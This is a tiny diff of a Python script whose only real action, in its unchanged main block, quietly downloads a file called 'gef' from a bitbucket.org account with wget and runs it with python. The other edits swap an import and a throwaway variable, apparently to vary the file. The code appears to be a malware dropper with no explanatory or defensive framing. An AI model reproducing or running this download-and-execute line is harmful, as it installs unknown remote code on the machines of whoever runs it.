@@ -1,4 +1,4 @@
-import sys,os,ftplib
-y=18
+import sys,os,time
+e=6
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
